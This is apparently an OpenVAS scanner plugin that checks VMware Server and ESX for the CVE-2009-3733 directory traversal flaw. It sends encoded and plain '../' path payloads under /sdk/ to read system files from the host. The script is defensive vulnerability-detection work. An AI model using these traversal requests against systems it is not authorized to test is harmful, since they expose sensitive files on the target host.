###############################################################################
# OpenVAS Vulnerability Test
#
# VMware Products Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100502");
  script_version("2019-05-13T14:05:09+0000");
  script_tag(name:"last_modification", value:"2019-05-13 14:05:09 +0000 (Mon, 13 May 2019)");
  script_tag(name:"creation_date", value:"2010-02-23 17:05:07 +0100 (Tue, 23 Feb 2010)");
  script_bugtraq_id(36842);
  script_cve_id("CVE-2009-3733");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("VMware Products Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Remote file access");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_vmware_esx_web_detect.nasl", "gb_vmware_esx_snmp_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8222);
  script_mandatory_keys("VMware/ESX/installed", "Host/runs_unixoide"); # only vmware running under linux is affected
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://secunia.com/advisories/37186");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2009/3062");
  script_xref(name:"URL", value:"http://securitytracker.com/alerts/2009/Oct/1023088.html");
  script_xref(name:"URL", value:"http://lists.vmware.com/pipermail/security-announce/2009/000069.html");
  script_xref(name:"URL", value:"http://www.vmware.com/security/advisories/VMSA-2009-0015.html");

  script_tag(name:"impact", value:"Successful exploitation will let the remote/local attacker to disclose
  sensitive information.");

  script_tag(name:"affected", value:"VMware Server version 2.0.x prior to 2.0.2 Build 203138,
  VMware Server version 1.0.x prior to 1.0.10 Build 203137 on Linux.");

  script_tag(name:"insight", value:"An error exists while handling certain requests can be exploited to download
  arbitrary files from the host system via directory traversal attacks.");

  script_tag(name:"solution", value:"Upgrade the VMWare product(s) according to the referenced vendor announcement.");

  script_tag(name:"summary", value:"The host is installed with VMWare product(s)and is prone to multiple
  vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:8222);
res = http_get_cache(item:"/", port:port);

# URL based on whether the target is esx/esxi or server
if("VMware ESX" >< res) {
  path = "/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/";
} else if("<title>VMware Server" >< res) {
  path = "/sdk/../../../../../../";
} else {
  exit(0); # not vmware
}

host = http_host_name(port:port);

req = http_get(item:"/ui/", port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if(!buf)
  exit(0);

if("Location: https://" >< buf) # port is redirected, will be checked if the https port is touched...
  exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url  = path + file;
  req  = string("GET ", url, " HTTP/1.1\r\n");
  req += string("TE: deflate,gzip;q=0.3\r\nConnection: TE, close\r\n");
  req += string("Host: ", host, "\r\n\r\n");

  buf = http_send_recv(port:port, data:req);
  if(!buf)
    continue;

  if(egrep(pattern:pattern, string:buf)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);